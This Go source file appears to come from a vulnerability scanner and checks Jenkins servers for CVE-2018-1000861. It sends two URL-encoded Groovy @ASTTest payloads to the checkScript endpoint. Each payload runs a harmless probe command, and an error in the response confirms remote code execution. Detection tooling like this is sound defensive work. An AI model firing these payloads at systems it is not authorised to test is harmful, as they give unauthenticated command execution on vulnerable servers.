package jenkins

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func CVE_2018_1000861(u string) bool {
	if req, err := util.HttpRequset(u, "GET", "", false, nil); err == nil {
		if req.Header.Get("X-Jenkins-Session") != "" {
			if req2, err := util.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22vtest%22)%7d)%0aclass+Person%7b%7d", "POST", "", false, nil); err == nil {
				if req2.StatusCode == 500 && util.StrContains(req2.Body, "No such file or directory") {
					util.SendLog(req.RequestUrl, "CVE-2018-1000861", "Found vuln Jenkins", "")
					return true
				}
			}
			if req3, err := util.HttpRequset(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+%22vtest%22.execute().text+%7d)%0aclass+Person%7b%7d", "POST", "", false, nil); err == nil {
				if req3.StatusCode == 500 && util.StrContains(req3.Body, "No such file or directory") {
					util.SendLog(req.RequestUrl, "CVE-2018-1000861", "Found vuln Jenkins", "")
					return true
				}
			}
		}
	}
	return false
}
